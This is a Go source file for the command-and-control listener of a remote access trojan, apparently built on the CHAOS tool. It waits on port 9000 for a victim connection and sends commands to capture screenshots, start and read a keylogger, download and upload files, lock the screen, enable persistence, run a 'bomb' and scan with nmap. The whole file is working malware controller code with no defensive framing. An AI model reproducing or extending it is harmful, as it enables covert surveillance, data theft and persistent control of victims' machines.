package main

import (
	"fmt"
	"io/ioutil"
	"kunpeng/fileutil"
	"net"
	"os"
	"os/exec"
	"strings"

	c "github.com/tiagorlampert/CHAOS/src/color"
	"github.com/tiagorlampert/CHAOS/src/util"
)

func AwaitForExternalConnection(lport string) {

	// Await for connection from target
	fmt.Println(c.CYAN, "[*] Waiting for connection on port "+lport+"...")
	ln, _ := net.Listen("tcp", ":"+lport)

	// Accept connection
	conn, _ := ln.Accept()
	fmt.Println(c.GREEN, "[+] Connected!")
	fmt.Println("")

	for {
		//cmd := prompt.Input(fileutil.BEGIN_NAME, completer.TargetCompleter)
		var cmd string
		fmt.Scan(&cmd)
		fmt.Printf(cmd)

		switch strings.TrimSpace(cmd) {

		case "clear":
			print("clear")
			util.ClearScreen()

		case "cls":
			util.ClearScreen()

		case "back":
			SendMessage(conn, "back")
			conn.Close()
			os.Exit(0)

		case "exit":
			SendMessage(conn, "exit")
			util.ClearScreen()
			fmt.Println("Bye, See you later!")
			os.Exit(0)

		case "screenshot":
			// Send a request message to get a screenshot
			SendMessage(conn, "screenshot")

			// Receive screenshot encoded
			encScreenshot := ReceiveMessageReturnDecodeString(conn)

			// Check if folder `screenshot` exist
			util.CheckIfNotExistAndCreateFolder("screenshot/")

			screenshotFileName := "screenshot/" + string(util.GetDateTime()) + ".png"

			fmt.Println(c.YELLOW, "[i] Getting ScreenShot...")

			// Write screenshot
			ioutil.WriteFile(screenshotFileName, []byte(DecodeToBytes(encScreenshot)), 777)

			// Open screenshot using
			_, err := exec.Command("sh", "-c", "eog "+"screenshot/"+util.GetDateTime()+".png").Output()
			if err != nil {
				fmt.Printf("%s", err)
			} else {
				fmt.Println(c.GREEN, "[*] Saved at "+screenshotFileName)
			}

		case "keylogger_start":
			SendMessage(conn, "keylogger_start")
			ReceiveMessage(conn)

		case "keylogger_show":
			SendMessage(conn, "keylogger_show")
			ReceiveMessage(conn)

		case "download":
			// Send a request message to get a download
			SendMessage(conn, "download")

			// Request a filepath to download and send request
			fmt.Print(" [?] File Path to Download: ")
			pathDownload := util.ReadLine()
			SendMessage(conn, pathDownload)

			// Request a name to save file
			fmt.Print(" [?] Output file name: ")
			outputFileName := util.ReadLine()

			encData := ReceiveMessageReturn(conn)

			fmt.Println(c.YELLOW, "[i] Downloading...")
			decData := DecodeToBytes(encData)

			util.CheckIfNotExistAndCreateFolder("download/")

			if string(decData) != "" {
				filePathSaveDownload := fileutil.GetCurrentDirectory() + "/" + "chaos_" + util.GetDateTime() + "_" + outputFileName
				if fileutil.CheckIfFileExist(filePathSaveDownload) {
					del := os.Remove(filePathSaveDownload)
					if del != nil {
						fmt.Println(del)
					}
				}
				print(filePathSaveDownload)
				fileutil.CreateFile(filePathSaveDownload)
				ioutil.WriteFile(filePathSaveDownload, []byte(decData), 777)

				fmt.Println(c.GREEN, "[*] Saved at "+filePathSaveDownload)
			} else {
				fmt.Println(c.RED, "[!] File not found! Check if path are correct.")
			}

		case "upload":
			// Send a request message to send a upload
			SendMessage(conn, "upload")

			fmt.Print(" [?] File Path to Upload: ")
			pathUpload := util.ReadLine()

			fmt.Print(" [?] Output file name: ")
			outputName := util.ReadLine()
			SendMessage(conn, outputName)

			fmt.Println(c.YELLOW, "[i] Uploading...")

			file, err := ioutil.ReadFile(pathUpload)
			if err != nil {
				fmt.Println(c.RED, "[!] File not found! Check if path are correct.")
			}
			SendMessageByte(conn, file)

		case "getos":
			SendMessage(conn, "getos")
			ReceiveMessage(conn)

		case "lockscreen":
			SendMessage(conn, "lockscreen")
			ReceiveMessage(conn)

		case "ls":
			SendMessage(conn, "ls")

			// Receive message encoded
			encScreenshot := ReceiveMessageReturnDecodeString(conn)
			fmt.Println(string(DecodeToBytes(encScreenshot)))

		case "persistence_enable":
			SendMessage(conn, "persistence_enable")
			ReceiveMessage(conn)

		case "persistence_disable":
			SendMessage(conn, "persistence_disable")
			ReceiveMessage(conn)

		case "bomb":
			SendMessage(conn, "bomb")
			ReceiveMessage(conn)

		case "openurl":
			SendMessage(conn, "openurl")

			fmt.Print(" [?] Type URL to Open: ")
			url := util.ReadLine()

			SendMessage(conn, url)
			ReceiveMessage(conn)
		case "nmap":
			SendMessage(conn, "nmap")
			ReceiveMessage(conn)
		}

		//if strings.TrimSpace(cmd) != "" {
		//	SendMessageRaw(conn, cmd)
		//	messageReturn := ReceiveMessageReturnDecodeString(conn)
		//
		//	if messageReturn != "" {
		//		fmt.Println(messageReturn)
		//	}
		//}
	}
}

func main() {
	AwaitForExternalConnection("9000")
}
